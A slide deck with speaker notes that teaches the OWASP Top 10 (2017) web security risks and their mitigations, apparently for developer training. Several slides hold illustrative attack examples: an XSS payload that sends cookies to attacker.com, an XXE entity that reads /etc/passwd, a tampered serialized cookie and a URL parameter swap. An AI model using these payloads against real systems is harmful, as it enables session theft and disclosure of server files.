# TOP 10 SECURITY ISSUES

Number 1 will surprise you!

---

# Said who?

## OWASP

Note:
Short time here, just go to next slide for detailed summary

+++

## What is OWASP

The Open Web Application Security Project

Note:
The Open Web Application Security Project - open community which is dedicated to enabling organizations
to develop, purchase and maintain applications which can be trusted. Non-profit, almost everyone is volunteer.

---

## Where does the data come from?

- 40+ data submissions from security companies |
- 515 individuals |
- Data spans 100k applications |

Note:
The OWASP Top 10 for 2017 is based primarily on 40+ data submissions from firms that specialize in application security and an
industry survey that was completed by 515 individuals. This data spans vulnerabilities gathered from hundreds of organizations and
over 100,000 real-world applications and APIs.

---?image=assets/start.gif&size=auto 60%

---

# Insufficient Logging and Monitoring
Number 10

+++

## What's that?

- Insufficient logging and monitoring |
- Ineffective incident response |

Note:
- Obviously the cause of insufficient logging is insufficient logging,
- But ineffective response to incidents are included in this point as well
- These flaws allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper with data.

+++

## How do I fight it?

<ul>
    <li class="fragment">All login, access control failures and input validation failures should be logged</li>
    <li class="fragment">Establish effective monitoring and alerting</li>
    <li class="fragment">Establish / adapt incident response and recovery plan (Such as one provided by [NIST](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final))</li>
</ul>

Note:
NIST -> National Institute of Standards and Technology

---

# Using Components with Known Vulnerabilities
Number 9

+++

## What's that?

Components (ex. libraries, frameworks) run with the same privileges as the application. 


If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover.


Note:
As you know, components...

So if a vulnerable...

+++

## How do I fight it?
<ul>
    <li class="fragment">Keep your dependencies up to date (tools: [versions](http://www.mojohaus.org/versions-maven-plugin/), [OWASP DependencyCheck](https://www.owasp.org/index.php/OWASP_Dependency_Check), [retire.js](https://github.com/retirejs/retire.js/))</li>
    <li class="fragment">Monitor sources like [Common Vulnerabilities and Exposures](https://cve.mitre.org/) and [National Vulnerability Database](https://nvd.nist.gov/) </li>
    <li class="fragment">Get packages from official sources and prefer signed packages</li>
    <li class="fragment">If update is not possible, consider using [virtual patch](https://www.owasp.org/index.php/Virtual_Patching_Best_Practices#What_is_a_Virtual_Patch.3F)</li>
</ul>

Note:
- Obviously keep your deps up to date
- Monitor sources like (list em) for updates
- Get Signed packages from official sources
- If update not possible, use virtual patching

---

## What is virtual patch?

#### A security policy enforcement layer which prevents the exploitation of a known vulnerability.

Note:
Since it's going to be mentioned few times, it would be nice to explain what Virtual Patch is. Its...

+++

## What is virtual patch?

The virtual patch works since the security enforcement layer analyzes transactions and intercepts attacks in transit, so malicious traffic never reaches the web application. 

---

# Insecure Deserialization
Number 8

+++

## What's that?

Insecure deserialization flaws occur when an application receives hostile serialized objects.

+++

### Example:

Application uses object serialization to save a cookie containing user ID, role, password hash.

```json
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```
@[1-2](Given the cookie)
@[4-5](Attacker changes the object to give themselves admin privileges)

+++

## How do I fight it?

- Don't accept serialized objects from untrusted sources |
- Only permit primitive data types |

Note:
The only safe architectural pattern is to not accept serialized
objects from untrusted sources or only permit primitive data types.

+++

## How do I fight it?

If not possible then:
- Monitor deserialization and alert if a user deserializes a lot |
- Log deserialization exceptions/failures |
- Put code which deserializes in low privilege environment |
- Enforce strict type constraints during deserialization before object creation |

---

# Cross-Site Scripting (XSS)
Number 7

+++

## What's that?

* Application includes untrusted data in a new web page without validation or escaping
* Application updates an existing web page with user supplied data using a browser API that can create JavaScript

+++

### Example:

```java
(String) page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";

'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
```

@[1-2](The application uses untrusted data in the construction of the following HTML snippet without validation or escaping)
@[4-6](The attacker modifies the ‘CC’ parameter in his browser and executes a script)

Note:
Double click!

+++

## How do I fight it?
- Use safe frameworks that automatically escape for XSS by design (ex. ReactJS) |
- Validate inputs |
- Escape outputs |

Note:
Links: https://www.owasp.org/index.php/Abridged_XSS_Prevention_Cheat_Sheet
---

# Security Misconfiguration
Number 6

+++

## What's that?

Name says it all, but for example:
- Insecure default configurations |
- Misconfigured HTTP headers |
- Error messages containing sensitive information |
- Not patching or upgrading systems, frameworks, dependencies, and components in a timely fashion |

+++

### Example:

The app server admin console is automatically installed and not removed.

+++

## How do I fight it?

- Create repeatable process for deploying locked down environment |
- Dev, QA and prod environments should be configured identically |
- Remove unused dependencies and frameworks | 
- Update as fast as possible (See Number 9) |
- Automated configuration verification process |

Note:
Ad2 - (With different credentials obviously)

---

# Broken Access Control
Number 5

+++

## What's that?

Restrictions on what authenticated users are allowed to do are not properly enforced. 


Attackers can exploit these flaws to access unauthorized functionality and/or data.

+++

### Example:

```java
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

example.com/app/accountInfo?acct=notmyacct
```
@[1-2](The application uses unverified data in a SQL call that is accessing account information)
@[4](An attacker simply modifies the 'acct' parameter)

Note:
Double click!

+++

## How do I fight it?

- With the exception of public resources, deny by default |
- Implement access control mechanisms once and re-use them throughout the application |
- Disable web server directory listing, ensure file metadata (ex. .git) is not present within web roots |
- Log access control failures |
- Rate limiting API to minimize the harm from automated attack tooling |
- Access control unit and integration tests |

---

# XML External Entities (XEE)
Number 4

+++

## What's that?

The XML standard includes the idea of an external general parsed entity (an external entity). 


During parsing of the XML document, the parser will expand these links and include the content of the URI in the returned XML document.

+++

### Example:

The attacker attempts to extract data from the server

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>

```

+++

## How do I fight it?

- Disable XML external entity and DTD processing |
- Validate inputs |
- Patch or upgrade all the latest XML processors and libraries |
- Upgrade SOAP to the latest version |
- If these controls are not possible, consider using virtual patching |

Note:
DTD -> Document type definition

---

# Sensitive Data Exposure
Number 3

+++

## What's that?

Web applications and APIS don't protect sensitive data.

Note:
So, what's that? Basically it' when Web applications ...

+++

### Example:

An application encrypts credit card numbers in a database using automatic database encryption. 


However, this data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text.

+++

## How do I fight it?
<ul>
    <li class="fragment">Discard sensitive data as soon as possible</li>
    <li class="fragment">Make sure you encrypt all sensitive data at REST</li>
    <li class="fragment">Encrypt all data in transit</li>
    <li class="fragment">Ensure up-to-date and strong standard algorithms or ciphers</li>
    <li class="fragment">Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)</li>
    <li class="fragment">Disable caching for responses that contain sensitive data</li>
</ul>

---

# Broken Authentication
Number 2

+++

## What's that?

Application functions related to authentication and session management implemented
incorrectly, allowing attackers to compromise:
- Passwords |
- Keys |
- Session tokens |
- Exploit other implementation flaws to assume other users’ identities |

+++

### Example:

Credential stuffing is a common attack. 


If an application does not rate limit authentication attempts


Then the application can be used as a password oracle to determine if the credentials are valid

Note:
Credential stuffing -> the use of lists of known passwords

+++

## How do I fight it?
<ul>
    <li class="fragment">Do not deploy with any default credentials</li>
    <li class="fragment">Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)</li>
    <li class="fragment">Implement password checks against [top 10000 worst passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)</li>
    <li class="fragment">Where possible, implement multi-factor authentication</li>
    <li class="fragment">Log authentication failures</li>
    <li class="fragment">Align password length, complexity and rotation policies with [NIST 800-63 B's guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret)</li>
</ul>

Note:
NIST -> National Institute of Standards and Technology
---

# Injection
Number 1

+++

## What's that?

Injection occurs when untrusted data is sent to an interpreter as part of a command or query.


The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

+++

### Example:

![Relevant XKCD](assets/injection_maymay.png)

+++

## How do I fight it?

Sanitize your inputs

---

### That's all folks!

Sources:
- [Top 10 by OWASP](https://github.com/OWASP/Top10/blob/master/2017/OWASP%20Top%2010%202017%20RC2%20Final.pdf)
- [XEE Definition from Wikipedia](https://en.wikipedia.org/wiki/XML_external_entity_attack)

